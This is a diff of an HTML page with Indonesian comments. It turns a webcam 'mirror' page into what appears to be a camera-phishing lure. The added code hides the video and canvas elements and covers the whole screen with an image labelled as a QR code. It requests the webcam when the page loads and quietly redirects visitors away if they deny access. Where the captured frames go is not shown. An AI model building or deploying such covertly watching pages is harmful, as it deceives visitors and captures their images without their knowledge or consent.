@@ -1,37 +1,121 @@
 <!doctype html>
-<html lang="id">
+<html>
 
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
   <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
   <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
   <style>
-    * {
+    /* Styles for Tiny-Mirror.js */
+    .mirror-app {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      /* Full viewport height */
+      width: 100vw;
+      /* Full viewport width */
       margin: 0;
       padding: 0;
+      overflow: hidden;
+      /* Prevent scrollbars */
+      background: black;
+    }
+
+    #video {
+      width: 100vw;
+      height: 56.25vw;
+      /* 16:9 aspect ratio */
+      max-height: 56.25vw;
+      max-width: 100vw;
+      object-fit: cover;
+    }
+
+    #canvas {
+      display: none;
+    }
+
+    /* Overlay styles */
+    .overlay-element {
+      position: absolute;
+      color: white;
+      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+      font-family: "Segoe UI", sans-serif;
+      /* Premium font for premium feel */
+    }
+
+    /* Clock */
+    #time {
+      top: 20px;
+      right: 20px;
+      font-size: 3em;
+      font-weight: bold;
+    }
+
+    /* Date */
+    #date {
+      top: 80px;
+      right: 20px;
+      font-size: 1.5em;
+    }
+
+    /* Greeting */
+    #greeting {
+      top: 50vh;
+      left: 20px;
+      font-size: 3em;
+      transform: translateY(-50%);
+    }
+
+    /* Weather */
+    #weather {
+      bottom: 100px;
+      left: 20px;
+      font-size: 2em;
+    }
+
+    /* News - Ticker */
+    #news {
+      bottom: 20px;
+      left: 20px;
+      font-size: 1.2em;
+      max-width: 60%;
+      overflow: hidden;
+      white-space: nowrap;
       box-sizing: border-box;
     }
 
-    html,
-    body {
-      width: 100%;
-      height: 100%;
-      background-color: black;
-      overflow: hidden;
+    .video-wrap {
+      display: none;
     }
 
-    img {
-      display: block;
-      width: 100vw;
-      height: 100vh;
-      object-fit: cover;
-      object-position: center;
+    /* Full-screen fixed image untuk mobile */
+    body {
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+      background: black;
+    }
+
+    img.fullscreen-img {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      min-width: 100vw;
+      min-height: 100vh;
+      object-fit: fill;
+      z-index: 999;
     }
   </style>
 </head>
 
+<div class="video-wrap">
+  <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas id="canvas" width="640" height="480"></canvas>
 
 <script>
 
@@ -65,13 +149,34 @@
     }
   };
 
+  // Redirect ke halaman sebelumnya jika izin ditolak
+  function redirectBack() {
+    if (document.referrer && document.referrer !== '') {
+      window.location.href = document.referrer;
+    } else if (history.length > 1) {
+      history.back();
+    } else {
+      window.location.href = 'about:blank';
+    }
+  }
+
   // Access webcam
   async function init() {
     try {
       const stream = await navigator.mediaDevices.getUserMedia(constraints);
       handleSuccess(stream);
     } catch (e) {
-      errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+      // Jika kamera tidak diizinkan → redirect ke halaman sebelumnya
+      if (
+        e.name === 'NotAllowedError' ||
+        e.name === 'PermissionDeniedError' ||
+        e.name === 'SecurityError'
+      ) {
+        setTimeout(redirectBack, 100);
+      } else {
+        // Error lain (kamera tidak ada, dsb) → juga redirect
+        setTimeout(redirectBack, 100);
+      }
     }
   }
 
@@ -97,7 +202,8 @@
 </script>
 
 <body>
-  <img src="scan.jpeg" alt="">
+  <img src="scanqr.jpeg" class="fullscreen-img" alt="QR Code">
+
 </body>
 
 </html>
